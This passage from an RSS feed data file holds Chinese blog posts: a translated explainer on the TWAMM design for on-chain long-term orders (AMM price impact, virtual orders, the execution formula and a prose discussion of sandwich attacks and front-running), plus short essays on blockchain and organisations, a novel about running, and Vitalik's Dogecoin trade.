美元的 ETH，这意味着他们将 2000 美元存入 X 储备，这样我们将有 x = 2,000 + 2,000 = 4,000。</p>\n<p>然后，由于 k=2000，我们在交易后必须有 y=x/k=2000/4000=0.5。由于 y 最初是 1，所以 1-0.5=0.5 个 ETH 会到交易者手里。</p>\n<p>由于交易者用他的 2000 个 USDC 购买了 0.5 个 ETH，他支付的平均价格是每个 ETH 4000 USDC。这个价格高于瞬时价格，表明相对于 AMM 的流动性而言，订单金额很大。</p>\n<h3 id=\"价格影响和逆向选择\">价格影响和逆向选择</h3>\n<p>在上述案例中，交易者不得不为他们的大订单支付每 ETH 4,000 USDC，而小订单的成本仅为每 ETH 2,000 USDC。这种价格差异被称为订单的<em>价格影响</em>。订单金额越大，价格影响就越大。</p>\n<p>这就是 AMM 对抗逆向选择的方式：大额订单更有可能被感知到，因此 AMM 让他们支付高价。这相当于自动化的淡化订单。</p>\n<h2 id=\"在当前的-amm-上执行大额订单\">在当前的 AMM 上执行大额订单</h2>\n<h3 id=\"手动拆分订单\">手动拆分订单</h3>\n<p>正如我们所看到的，单笔交易中执行大额订单，在 AMM 里被设计得很昂贵。<a href=\"https://www.paradigm.xyz/2021/04/understanding-automated-market-makers-part-1-price-impact/\"   target=\"_blank\" >这篇精彩的文章</a> 深入探讨了这个问题并推荐了一些解决方案。</p>\n<p>简而言之，希望在 AMM 上执行大额订单的交易者不应该在单笔交易中执行：他们最好将订单分成若干部分。这可能涉及到同时向几个 AMM 发送订单，不过这些 AMM 在任何时间点上的流动性也都有限。订单金额越大，随着时间推移逐渐拆分订单就越有吸引力。</p>\n<p>例如，假设一个投资者想在链上购买 1 亿 USDC 的 ETH。他们没有任何关于 ETH 价格的短期信息，所以不介意订单需要一些时间来执行。在这种情况下，他们可能会把订单拆分成 10 部分，每部分 1000 万 USDC，每隔一小时执行一部分，从而限制每部分的价格影响。</p>\n<h3 id=\"子订单大小的权衡\">子订单大小的权衡</h3>\n<p>显然，如果一个非常大的订单被分割成几块，每个单独的子订单仍然很大，并将产生相应的价格影响。将订单分割成更小的部分会有帮助，但这也引入了两个新问题。</p>\n<p>第一个问题是<em>操作复杂性</em>，意味着风险和工作量的增加。交易者可能会输错交易量，或者输错交易方向。或者她的电脑可能死机，使得一些订单没法执行。即使一切顺利，这个过程也需要时间和精力，把注意力从更有利可图的工作中分散出来。</p>\n<p>第二个问题是，每笔交易都会产生固定的<em>交易成本</em>，如支付给以太坊矿工处理交易的<em>gas</em>。如果交易者将她的订单分成太多部分，她最终可能会支付比实际购买的 ETH 还要多的交易费用。</p>\n<h2 id=\"与传统金融的类比\">与传统金融的类比</h2>\n<p>在传统金融的世界里，如果一个投资者或机构想购买 1 亿美元的苹果股票，他们不会直接向交易所发送 1 亿美元的购买订单。他们也不会发送 10 个这样的订单，每个 1000 万美元。把订单分成比这小得多的部分，对大多数没有专门交易人员和基础设施的人来说是不现实的。</p>\n<p>相反，他们最有可能将他们的大订单发送给经纪人，经纪人将为他们在交易所进行 <a href=\"https://en.wikipedia.org/wiki/Algorithmic_trading\"   target=\"_blank\" >算法交易</a> 并收取费用。经纪人会在一个特定的时间段内执行交易，比如 8 个小时，价格会有大致的基准。经纪人有一个专门执行这种交易的团队，既安全又便宜。</p>\n<h3 id=\"twap时间加权平均价格订单\">TWAP（时间加权平均价格）订单</h3>\n<p>最基本的算法交易类型可能就是 <a href=\"https://en.wikipedia.org/wiki/Time-weighted_average_price\"   target=\"_blank\" >时间加权平均价格</a>，或 TWAP（发音为 &ldquo;tee-whap&rdquo;）订单。一个在 8 小时内买入 1 亿美元苹果股票的 TWAP 订单，顾名思义，将以接近该期间苹果股票的时间加权平均价的价格成交。</p>\n<p>例如，如果苹果股票在这段时间内有四个小时的价格是 100 美元，四个小时的价格是 120 美元，那么时间加权平均价格将是 ($100*4+$120*4)/8=110 美元，经纪人将以接近这个价格执行 TWAP 订单。</p>\n<p>细节各不相同，但经纪人多半会通过在一天内将其分割成许多小块并发送给市场来执行这一交易。在 8 个小时内买入 1 亿美元的苹果股票，相当于每 100 毫秒买入约 350 美元的苹果股票，我们可能期望经纪人或多或少会这样做。</p>\n<p>经纪人有基础设施来减少或消除如此多小交易的操作复杂性，而且，由于他们与市场有直接联系，很可能不必支付太多的交易成本。</p>\n<h2 id=\"时间加权做市商\">时间加权做市商</h2>\n<p>时间加权做市商（TWAMM）相当于提供了链上的 TWAP 订单。TWAMM 有专门的逻辑来分割订单，并直接连接到内置交易所，在低 gas 成本下平滑执行。套利者使 TWAMM 内置交易所的价格与市场价格保持一致，以确保订单执行接近于时间加权平均价格。</p>\n<h3 id=\"概述\">概述</h3>\n<p>每个 TWAMM 实例为特定的资产对提供交易，如 ETH 和 USDC。</p>\n<p>TWAMM 包含一个内置的 AMM，即这两种资产的标准恒定乘积做市商。任何人都可以在任何时候与这个内置 AMM 进行交易，仿佛它是个普通的 AMM 一样。</p>\n<p>交易者可以向 TWAMM 提交<em>长期订单</em>，即在固定数量的区块中出售固定数量的资产 —— 比如，在未来 2000 个区块中卖出 100ETH 的订单。</p>\n<p>TWAMM 将这些长期订单分解为无限多、无限小的虚拟子订单，这些虚拟子订单逐渐以均匀的速度与内置 AMM 交易。单独处理这些虚拟子订单的交易将耗费无限的 gas，但一个闭型数学公式允许我们在需要时才计算其累积结果。</p>\n<p>长期订单的执行将推动内置 AMM 的价格随着时间的推移远离其他市场的价格。当这种情况发生时，套利者将针对内置 AMM 的价格进行套利交易，使其回到一致，确保长期订单的良好执行。</p>\n<p>例如，如果长期卖出订单使得 ETH 在内置 AMM 上的价格比某个中心化交易所的价格更便宜，套利者将从内置 AMM 上买入 ETH，使其价格回升，并在中心化交易所卖出来获利。</p>\n<h3 id=\"以太坊复习\">以太坊复习</h3>\n<h4 id=\"区块\">区块</h4>\n<p>以太坊将交易打包成连续的小组，称为区块，大约每 13 秒一个。在这本文里，我们将对每个区块进行编号：区块 1 后面是区块 2，区块 2 后面是区块 3，以此类推。</p>\n<h4 id=\"矿工\">矿工</h4>\n<p>分散的矿工群体会竞争处理每个区块。任何能接入互联网的人都可以成为矿工。这意味着像 AMM 这种运行在以太坊上的程序没有任何秘密：每个人都必须能够准确计算出在某个输入的情况下会发生什么。</p>\n<h4 id=\"gas\">Gas</h4>\n<p>以太坊上的计算是一种稀缺资源，因此用户必须以 gas 的形式向矿工付费。一个交易涉及的计算量越大，它消耗的 gas 就越多。这个 gas 成本完全由提交交易的人支付。</p>\n<h3 id=\"基本设计\">基本设计</h3>\n<h4 id=\"长期订单\">长期订单</h4>\n<p>Alice 想在未来 8 小时内买入价值 1 亿美金的 ETH，或者大约 2000 个区块。她在 TWAMM 中下了一个长期订单，在 2000 个区块中购买价值 1 亿 USDC 的 ETH，或每个区块 50,000 USDC。</p>\n<p>正如之前提到的，我们无法事先知道哪些矿工将在 TWAMM 上处理未来的交易。这意味着 Alice 的订单必须对每个人都是可见的，这就引入了信息泄露的问题，我们会在下面讨论。</p>\n<h4 id=\"订单池\">订单池</h4>\n<p>Bob 想在接下来的 5000 个区块中卖出 500 个 ETH 换取 USDC，即每个区块 0.1ETH。</p>\n<p>Charlie 想在接下来的 2000 个区块中卖出 100 个 ETH 换取 USDC，即每区块 0.05 个 ETH。</p>\n<p>在 Charlie 的订单在 2000 个区块内到期之前，Bob 和 Charlie 的订单将被分组在一个池中。</p>\n<p>这个 ETH 卖出池将在接下来的 2000 个区块中以每区块 0.15ETH 的速度卖出 ETH。Bob 将获得该池子收到 USDC 的 0.1/0.15≈66%，Charlie 则获得 0.05/0.15≈33%。</p>\n<h4 id=\"虚拟订单\">虚拟订单</h4>\n<p>在接下来 2000 个区块的每个区块中，TWAMM 要代表 Alice 买入价值 50,000 USDC 的 ETH，还要代表 ETH 卖出池卖出 0.15 ETH 换取 USDC。</p>\n<p>我们可以想象，TWAMM 将这两个子订单中的每一个分成数万亿个微小的子子订单，我们称之为虚拟订单（事实上，它将它们分成无数个无限小的虚拟订单）。</p>\n<p>然后，TWAMM 轮流对内置 AMM 执行这些虚拟订单：首先是 Alice 的一个虚拟订单，然后是 ETH 卖出池的一个，然后是 Alice 的另一个，以此类推。</p>\n<h4 id=\"套利\">套利</h4>\n<p>因为 Alice 买入的 ETH 比 ETH 池卖出的 ETH 多得多，所以内置 AMM 上的 ETH 价格在每个区块都会上升。</p>\n<p>当这个价格相对于其他地方的 ETH 价格足够高时，套利者会在其他交易所买入更便宜的 ETH，然后在内置 AMM 上卖出，让价格回到市场平均水平，确保 Alice 的订单良好地执行。</p>\n<h4 id=\"订单到期\">订单到期</h4>\n<p>在 2,000 个区块之后，Alice 的订单将被完全成交，Charlie 的也是如此。Bob 卖出 ETH 的订单在接下来的 3000 个区块中仍然有效，TWAMM 将在这期间以每区块 0.1ETH 的速度继续执行。</p>\n<p>如果没有任何外部活动，随着时间的推移，这将推动内置 AMM 上 ETH 的价格下降，这次则促使套利者在价格充分偏离后将它重新拉升。</p>\n<h4 id=\"经济学\">经济学</h4>\n<p>由于 Alice、Bob 或 Charlie 都不急于执行他们的订单，其他市场参与者可以推断出他们的订单所代表的逆向选择比较少，并可以为他们提供低价格影响的交易。</p>\n<p>由于 TWAMM 将会是像 Alice、Bob 和 Charlie 这样的人进行交易的最佳场所，TWAMM 的内置 AMM 上的流动性提供者会乐意与这些大体量的不知情资金进行交互。这有助于从费用中赚钱，同时相对减少他们对逆向选择的暴露。</p>\n<h3 id=\"无限小的虚拟订单\">无限小的虚拟订单</h3>\n<p>我们在上面提到，TWAMM 将长期订单分割成无限多的无限小的子订单。这样做有两个原因：平滑性和效率。</p>\n<h4 id=\"平滑性\">平滑性</h4>\n<p>TWAMM 的主要目标是在一段时间内平滑地执行长期订单，使其以接近当时的时间加权平均价格执行。</p>\n<p>随着我们减小虚拟交易的金额，AMM 上价格轨迹中的锯齿变得越来越小。</p>\n<p>在极限情况下，有无限多的无限小的交易，价格轨迹在虚拟交易被执行时是完全平滑的。</p>\n<p><img src=\"https://zhangluyao.com/images/twamm/amm_eth-1-1536x1153.png\" alt=\"\"></p>\n<p>见 <a href=\"https://github.com/para-dave/twamm/blob/master/splitting_exploration.ipynb\"   target=\"_blank\" >https://github.com/para-dave/twamm/blob/master/splitting_exploration.ipynb</a></p>\n<h4 id=\"效率\">效率</h4>\n<p>由于 TWAMM 被设计为在以太坊上使用，在每一个区块中都准确计算多笔虚拟交易将是非常昂贵的。然而，当我们有无限多的无限小的交易时，我们可以在单次计算中算出交易者的结果，无论距离上次检查已经过了多少个区块。</p>\n<h2 id=\"实现\">实现</h2>\n<h3 id=\"惰性求值\">惰性求值</h3>\n<p>TWAMM 将虚拟子订单视为发生在多个区块之间，这对避免三明治攻击很重要。</p>\n<p>为了以节省 gas 的方式实现这一点，TWAMM 使用<em>惰性求值（lazy evaluation）</em>，只在需要确定交互结果时才计算虚拟交易的效果。</p>\n<p>每次用户与 TWAMM 交互时（例如，与内置 AMM 交易，或添加新的长期订单），TWAMM 将追溯计算自上次交互以来发生的所有虚拟交易的结果。</p>\n<p>因为这些虚拟交易只与 TWAMM 的内置 AMM 交互，所以 TWAMM 的状态在两次外部交互之间是完全确定不变的。即使 TWAMM 在两次外部交互之间有一百万个区块，下次有人与它交互时，它还是能够准确地计算出所有虚拟交易的结果。</p>\n<p>接入 TWAMM 的前端页面，将可以通过追踪当前区块编号，自己进行 TWAMM 计算来得到尚未在链上呈现的虚拟交易结果。</p>\n<h3 id=\"gas-优化\">Gas 优化</h3>\n<h4 id=\"订单池-1\">订单池</h4>\n<p>如例子所示，当我们有多个同方向的长期订单时（如卖出 ETH 换取 USDC），我们会在把它们分割成虚拟订单之前，先将它们集中在一个池子里。然后，TWAMM 可以用一种 <a href=\"https://www.paradigm.xyz/2021/05/liquidity-mining-on-uniswap-v3/\"   target=\"_blank\" >十亿美元算法</a> 来追踪余额，这种算法曾在 Compound 和 Uniswap 等协议中用于追踪 LP 奖励。</p>\n<p>从技术上讲，每个 TWAMM 总是有两个长期订单池，两种资产各一个：例如，卖出 USDC 的池和卖出 ETH 的池。只是在任何时候，这些池子中的一个或两个都有可能是空的。</p>\n<h4 id=\"长期订单的到期\">长期订单的到期</h4>\n<p>当把订单池和惰性求值结合起来使用时，会出现一种复杂情况。</p>\n<p>想象一下，Bob 下了一个在未来 100 个区块内卖出 100ETH 的订单，Charlie 下了一个在未来 200 个区块内卖出 200ETH 的订单。两个订单都是以每区块 1ETH 的速度卖出。</p>\n<p>假设在接下来的 150 个区块中没有人与 TWAMM 交互，此时出现了一次新的外部交互。在 Bob 和 Charlie 下单后的前 100 个区块中，他们的订单被汇集成一个共同的订单，每区块卖出 2 个 ETH。然而，在这之后的 50 个区块中，Charlie 的订单是独立的，每区块只卖 1 个 ETH。</p>\n<p>这意味着我们必须做两个独立的交易计算，来搞明白发生了什么：一个是前 100 个区块的结果，一个是最后 50 个区块的计算。在最坏的情况下，如果在过去的 150 个区块中，每个区块都有订单到期，这意味着 TWAMM 将不得不处理每个区块的交易，严重影响了 gas 效率。</p>\n<p>最简单的解决方法是限制订单到期的区块数量：例如，TWAMM 可以指定订单只能每 250 个区块到期一次，即大约每小时一次。</p>\n<h4 id=\"长期订单的取消\">长期订单的取消</h4>\n<p>用户可以在任何时候取消长期订单。在实践中，这允许用户为他们的订单选择取消时间，精确到区块。这不会增加系统的 gas 负担，因为想取消订单的用户要支付自己的 gas。</p>\n<h3 id=\"虚拟交易中的数学\">虚拟交易中的数学</h3>\n<h4 id=\"定义\">定义</h4>\n<p>假设距离 TWAMM 最后一次执行任何虚拟交易已经过去了 t 个区块。</p>\n<p>为简单起见，假设没有长期订单过期，那么在整个时间段内，X 的卖出池每区块卖出 \\(x_{rate}\\)，Y 的卖出池每区块卖出 \\(y_{rate}\\)。</p>\n<p>那么这段时间内卖出的 X 总量为 \\(tx_{rate}=x_{in}\\)，这段时间内卖出的 Y 总量为 \\(ty_{rate}=y_{in}\\)。</p>\n<p>让我们把时间段开始时的内置 AMM 储备分别表示为 \\(x_{ammStart}\\) 和 \\(y_{ammStart}\\) 。</p>\n<h4 id=\"公式\">公式</h4>\n<p>在所有的虚拟交易处理完毕后，内置 AMM 中 X 储备量为</p>\n<p>\\[x_{ammEnd} = \\sqrt {\\frac {kx_{in}}{y_{in}}}\\frac {e^{2\\sqrt {\\frac {x_{in} y_{in}}{k}}}+c}{e^{2\\sqrt {\\frac {x_{in} y_{in}}{k}}}-c}\\]</p>\n<p>其中</p>\n<p>\\[c = \\frac {\\sqrt {x_{ammStart} y_{in}}-\\sqrt {y_{ammStart} x_{in}}}{\\sqrt {x_{ammStart} y_{in}}+\\sqrt {y_{ammStart} x_{in}}}\\]</p>\n<p>从恒定乘积公式，我们知道</p>\n<p>\\[y_{ammEnd}=\\frac {x_{ammStart} y_{ammStart}}{x_{ammEnd}}\\]</p>\n<p>X 的卖出池得到所有没有最终进入内置 AMM 的 Y—— 也就是说，</p>\n<p>\\[y_{out} = y_{ammStart} + y_{in} - y_{ammEnd}\\]</p>\n<p>类似的，</p>\n<p>\\[x_{out} = x_{ammStart} + x_{in} - x_{ammEnd}\\]</p>\n<h2 id=\"潜在的攻击途径\">潜在的攻击途径</h2>\n<h3 id=\"三明治攻击\">三明治攻击</h3>\n<h4 id=\"描述\">描述</h4>\n<p>在 <a href=\"https://research.paradigm.xyz/MEV\"   target=\"_blank\" >三明治攻击</a> 中，攻击者 Atticus 看到交易员 Trey 即将在 AMM 上进行交易。Atticus 发送两个订单，将 Trey 的订单夹在中间，从中获利。</p>\n<p>想象一下，Trey 向一个 AMM 发送了一个用 USDC 购买 ETH 的订单。看到这一点，Atticus 在 Trey 之前在 AMM 上下了一个购买 ETH 的订单，推动价格上涨。由于他向 AMM 付手续费并产生了价格影响，Atticus 在这个订单上是亏损的。</p>\n<p>当 Trey 的订单被执行时，他以比原来更高的价格买入 ETH，因为 Atticus 已经推高了价格。Trey 的订单推动了价格进一步上涨。</p>\n<p>现在，Atticus 把他的 ETH 卖回给 AMM。由于 Trey 买入后推高了 AMM 的价格，他卖出的价格高于他买入的价格，能够实现盈利。</p>\n<p>只有当 Atticus 能保证在 Trey 买入后，他能够立即将他的 ETH 卖回 AMM，这种攻击才有意义。在一个特定的区块内，如果 Atticus 是一个矿工，或与一个矿工达成合作，或者使用像 <a href=\"https://medium.com/flashbots/frontrunning-the-mev-crisis-40629a613752\"   target=\"_blank\" >Flashbots</a> 这样的服务，就有可能。</p>\n<h4 id=\"三明治攻击和虚拟订单\">三明治攻击和虚拟订单</h4>\n<p>乍一看，虚拟订单似乎特别容易受到夹层攻击，因为每个人都知道它们会到来。</p>\n<p>然而，它们是安全的，因为交易是在区块之间执行的。想要夹住 TWAMM 虚拟订单的攻击者必须在一个区块末尾时在内置 AMM 进行交易，导致虚拟订单在区块之间以较差的价格执行，然后在下一个区块开始时进行反向交易。</p>\n<p>目前来说，攻击者没有办法保证他们只在某个区块的末尾进行交易，同时还能在下一个区块的开头进行交易。当这种<em>多区块 MEV</em>变得更加普遍时，允许交易者跨越多个区块进行夹击可能会成为一个问题。</p>\n<h4 id=\"信息泄露\">信息泄露</h4>\n<p>长期交易者在 TWAMM 中可能遇到的最大权衡是他们在下公开可见的订单时面临的<em>信息泄露</em>，由于以太坊的性质，这是必然的。</p>\n<p>如果一个交易者下了一个足够大的长期订单，其他交易者可能会被<em>抢跑 (front-run)</em> 诱惑，在 TWAMM 的内置 AMM 和其他地方买入资产，以便在长期订单推高价格的时候卖回给该交易者。</p>\n<p>由于用户可以在任何时候取消他们的长期订单，我们预计过于激进的抢跑者会被其他交易者所利用，从而控制信息泄露的整体影响。</p>\n<h4 id=\"例子\">例子</h4>\n<p>想象一下，Sally 注意到了 TWAMM 上激进的抢跑行为。于是她从一个流动性聚合器中购买了 100 万 USDC 的 ETH，推高了整个市场的价格。然后她在 TWAMM 上下了一个巨大的长期订单，在接下来的 24 小时内每个区块买入 10 万 USDC 的 ETH。</p>\n<p>马上，抢跑者 Frank 看到了这个订单，并通过聚合器买入一百万 USDC 的 ETH，进一步推高了价格。Sally 通过聚合器卖回了她的 ETH，获得了收益，推动价格回落，给 Frank 留下了损失。最后，她在订单被执行之前取消了她的长期订单。</p>\n<h2 id=\"python-参考实现\">Python 参考实现</h2>\n<p>你可以在 <a href=\"https://github.com/para-dave/twamm\"   target=\"_blank\" >这里</a> 看到一个 TWAMM 的 Python 参考实现。</p>\n<p>这个 <a href=\"https://github.com/para-dave/twamm/blob/master/twamm_demo.ipynb\"   target=\"_blank\" >Jupyter notebook</a> 演示了 TWAMM 的行为，有多个互相抵消的长期订单和套利者。</p>\n<p>为了简单起见，这个 Python 版本没有实现 gas 优化，如订单池或真正的惰性求值。</p>\n<h2 id=\"总结\">总结</h2>\n<p>我们已经勾勒出了 TWAMM 的设计，但我们的工作才刚刚开始。</p>\n<p>如果你对这个问题或类似的问题感兴趣，你可以发邮件到 <a href=\"ideas@uniswap.org\"  >dave@paradigm.xyz</a> 或 <a href=\"https://twitter.com/messages/compose?recipient_id=1184231093576392704\"   target=\"_blank\" >在 Twitter 上私信我</a>，或者联系 Uniswap 实验室，<a href=\"ideas@uniswap.org\"  >ideas@uniswap.org</a>。</p>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/twamm/",
          "creator": "Luyao",
          "pubDate": "Thu, 29 Jul 2021 23:24:18 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "6e7024deb1c6f7a291cdae8f6d30d877",
          "highlights": []
        },
        {
          "title": "从“系统”的层面解决“组织”的问题",
          "description": "<p>我们今天在组织里，要花很多力气琢磨如何激励员工，如何约束员工，如何促进交流，如何减少人与人的政治问题。</p>\n<p>但<strong>我怀疑，这一切是否都是在一个错误的系统上反复打补丁</strong>，因为这些事情都与组织本身有关，而跟它的业务无关。理论上，如果有一个系统统一地解决这些问题，而组织本身专注于业务，会高效得多。</p>\n<p>之所以这么想，是受到了区块链项目的启发。</p>\n<p>在以太坊上，要转账1亿美金，只需要一行代码，而传统金融中，可能需要上百万行代码，有无穷无尽的可靠性、安全性问题需要你去解决，稍有不慎，资产就出问题了。</p>\n<p>之所以有这种差异，是因为<strong>在以太坊上你不需要考虑这些问题</strong>，系统已经帮你解决了这些问题。系统向你承诺了你的每句话都会被执行，你便不需要再去考虑非常底层的安全性，你可以完全专注于业务本身。</p>\n<p>这就是为什么许多 DeFi 项目的代码量只有传统金融的 1% 都不到，因为其他那 99% 实际上都是无用功。</p>\n<p>我怀疑组织中也会发生类似的变化，即<strong>和组织有关的问题，会被系统解决，而组织本身专注于业务</strong>。</p>\n<p>之所以过去没有，而今天有了可能，我认为是以前不存在这样的工具。</p>\n<p>过去的工具，无论是制度、理念，还是工具，都依赖于人去实施。而人是不稳定的因素，人与人、人与组织之间，随时可能出现利益不对齐的情况，这是许多问题的根源。</p>\n<p><strong>区块链的出现，使得一个系统不依赖“人”也能运行</strong>。</p>\n<p>比如比特币的挖矿机制，矿工们可以看作是一家叫做“比特币公司”的员工，这些人维护着比特币网络的安全运行，而这个公司却没有领导，也没有任何章程制度，唯一存在的是比特币中挖矿机制的代码。这些代码对齐了所有矿工的利益，如果你不好好挖矿，唯一的结果就是少赚钱。这个系统运行至今且超过了万亿市值。</p>\n<p><strong>比特币的例子，说明了“由底层解决组织问题，而组织本身专注于业务”是存在的、可行的，只是它还不通用而已</strong>。</p>\n<p>未来是否会有更通用的系统存在，从系统层面解决组织内问题，激励大家对齐利益，专注于业务？我相信一定会有，虽然现在还不知道那是什么。</p>\n",
          "content": "<p>我们今天在组织里，要花很多力气琢磨如何激励员工，如何约束员工，如何促进交流，如何减少人与人的政治问题。</p>\n<p>但<strong>我怀疑，这一切是否都是在一个错误的系统上反复打补丁</strong>，因为这些事情都与组织本身有关，而跟它的业务无关。理论上，如果有一个系统统一地解决这些问题，而组织本身专注于业务，会高效得多。</p>\n<p>之所以这么想，是受到了区块链项目的启发。</p>\n<p>在以太坊上，要转账1亿美金，只需要一行代码，而传统金融中，可能需要上百万行代码，有无穷无尽的可靠性、安全性问题需要你去解决，稍有不慎，资产就出问题了。</p>\n<p>之所以有这种差异，是因为<strong>在以太坊上你不需要考虑这些问题</strong>，系统已经帮你解决了这些问题。系统向你承诺了你的每句话都会被执行，你便不需要再去考虑非常底层的安全性，你可以完全专注于业务本身。</p>\n<p>这就是为什么许多 DeFi 项目的代码量只有传统金融的 1% 都不到，因为其他那 99% 实际上都是无用功。</p>\n<p>我怀疑组织中也会发生类似的变化，即<strong>和组织有关的问题，会被系统解决，而组织本身专注于业务</strong>。</p>\n<p>之所以过去没有，而今天有了可能，我认为是以前不存在这样的工具。</p>\n<p>过去的工具，无论是制度、理念，还是工具，都依赖于人去实施。而人是不稳定的因素，人与人、人与组织之间，随时可能出现利益不对齐的情况，这是许多问题的根源。</p>\n<p><strong>区块链的出现，使得一个系统不依赖“人”也能运行</strong>。</p>\n<p>比如比特币的挖矿机制，矿工们可以看作是一家叫做“比特币公司”的员工，这些人维护着比特币网络的安全运行，而这个公司却没有领导，也没有任何章程制度，唯一存在的是比特币中挖矿机制的代码。这些代码对齐了所有矿工的利益，如果你不好好挖矿，唯一的结果就是少赚钱。这个系统运行至今且超过了万亿市值。</p>\n<p><strong>比特币的例子，说明了“由底层解决组织问题，而组织本身专注于业务”是存在的、可行的，只是它还不通用而已</strong>。</p>\n<p>未来是否会有更通用的系统存在，从系统层面解决组织内问题，激励大家对齐利益，专注于业务？我相信一定会有，虽然现在还不知道那是什么。</p>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/org/",
          "creator": "Luyao",
          "pubDate": "Wed, 28 Jul 2021 13:21:39 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "2fccb5896648268bdf0ca7f48335a38a",
          "highlights": []
        },
        {
          "title": "读《强风吹拂》",
          "description": "<p>在许多热血漫画中，主人公受到刺激后，都会热血爆棚发挥出超常的能力战胜对方。</p>\n<p>但在《<a href=\"https://book.douban.com/subject/26210487/\"   target=\"_blank\" >强风吹拂</a>》中没有，完全没有那种靠临时发挥就超越强者的情节。</p>\n<p>倘若你在长跑中，受到刺激，就开始加速热血狂奔，只会让你提前耗尽体力，在后续的路段中落得下风。</p>\n<p>所以<strong>在长跑中，大家都是在跟自己战斗</strong>，目标是跑出自己最好成绩，而不是试图去跑赢一个原本实力就比自己强很多的人。</p>\n<p>这和人生有点像。</p>\n<p>人生也是一个长跑，受到刺激后短暂地迸发出一些激情，那并不足以改变整个长跑，真正的对手是自己，要时刻跑出自己最好的状态。</p>\n<p>这也好像，前一晚没睡好，第二天你没法通过热血意志来达到工作高效，你唯一能做的是好好睡一觉。</p>\n<p>同时，长跑只能靠平时的练习，人生也一样，你不能在某个当下捶胸顿足说“你居然看不起我”，你得靠平时的认真和努力。</p>\n",
          "content": "<p>在许多热血漫画中，主人公受到刺激后，都会热血爆棚发挥出超常的能力战胜对方。</p>\n<p>但在《<a href=\"https://book.douban.com/subject/26210487/\"   target=\"_blank\" >强风吹拂</a>》中没有，完全没有那种靠临时发挥就超越强者的情节。</p>\n<p>倘若你在长跑中，受到刺激，就开始加速热血狂奔，只会让你提前耗尽体力，在后续的路段中落得下风。</p>\n<p>所以<strong>在长跑中，大家都是在跟自己战斗</strong>，目标是跑出自己最好成绩，而不是试图去跑赢一个原本实力就比自己强很多的人。</p>\n<p>这和人生有点像。</p>\n<p>人生也是一个长跑，受到刺激后短暂地迸发出一些激情，那并不足以改变整个长跑，真正的对手是自己，要时刻跑出自己最好的状态。</p>\n<p>这也好像，前一晚没睡好，第二天你没法通过热血意志来达到工作高效，你唯一能做的是好好睡一觉。</p>\n<p>同时，长跑只能靠平时的练习，人生也一样，你不能在某个当下捶胸顿足说“你居然看不起我”，你得靠平时的认真和努力。</p>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/self/",
          "creator": "Luyao",
          "pubDate": "Sat, 24 Jul 2021 13:55:47 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "bb362688bb1e0677f03a81ab203d391b",
          "highlights": []
        },
        {
          "title": "Vitalik 和狗币",
          "description": "<p>Vitalik 讲了个有点好笑的故事。</p>\n<p>他在 2016 年时买了 25,000 美元的狗币（Doge Coin），那会狗币还没什么人关注，“我很担心要怎么跟妈妈交待自己买了个啥，因为这玩意儿除了一个狗头像外真的啥也没有”。</p>\n<p>结果这笔交易成了他最成功的一笔投资。</p>\n<p>去年新冠时他在新加坡，有一天狗币突然从 0.8 美分涨到了 7 美分，<strong>他意识到自己有钱了，然后美滋滋地卖掉了一半</strong>，套现了 430 万美元。</p>\n<p>那天下午，狗币又从 7 美分掉到了 4 美分。能成功在顶部套现，他当时感觉自己的交易操作真是太牛逼了：</p>\n<blockquote>\n<p><strong>&ldquo;I remember just feeling like I was such an amazing trader&hellip;&rdquo;</strong></p>\n</blockquote>\n<p>结果狗币接下来一路涨，从 4 美分涨回了 7 美分，然后涨到了 50 美分。“它变成了现象级的，很多人连以太坊都没听过，但去买了狗币，这是我没想到的”。</p>\n<p>听V神讲这个小故事，我发现他有一种特殊的幽默感，他后面还讲了很多故事，都有点好笑。同时我发现他也是<strong>凡人</strong>，原本觉得他是一个圣贤、一个理性的机器人，如今意识到其实他和我们一样，也是一个看到币价涨了会美滋滋的平凡人。</p>\n",
          "content": "<p>Vitalik 讲了个有点好笑的故事。</p>\n<p>他在 2016 年时买了 25,000 美元的狗币（Doge Coin），那会狗币还没什么人关注，“我很担心要怎么跟妈妈交待自己买了个啥，因为这玩意儿除了一个狗头像外真的啥也没有”。</p>\n<p>结果这笔交易成了他最成功的一笔投资。</p>\n<p>去年新冠时他在新加坡，有一天狗币突然从 0.8 美分涨到了 7 美分，<strong>他意识到自己有钱了，然后美滋滋地卖掉了一半</strong>，套现了 430 万美元。</p>\n<p>那天下午，狗币又从 7 美分掉到了 4 美分。能成功在顶部套现，他当时感觉自己的交易操作真是太牛逼了：</p>\n<blockquote>\n<p><strong>&ldquo;I remember just feeling like I was such an amazing trader&hellip;&rdquo;</strong></p>\n</blockquote>\n<p>结果狗币接下来一路涨，从 4 美分涨回了 7 美分，然后涨到了 50 美分。“它变成了现象级的，很多人连以太坊都没听过，但去买了狗币，这是我没想到的”。</p>\n<p>听V神讲这个小故事，我发现他有一种特殊的幽默感，他后面还讲了很多故事，都有点好笑。同时我发现他也是<strong>凡人</strong>，原本觉得他是一个圣贤、一个理性的机器人，如今意识到其实他和我们一样，也是一个看到币价涨了会美滋滋的平凡人。</p>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/vitalik_doge/",
          "creator": "Luyao",
          "pubDate": "Tue, 20 Jul 2021 14:36:30 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "812c100e367fddefce2be1d386536a22",
          "highlights": []
        },
        {
          "title": "好媒体",
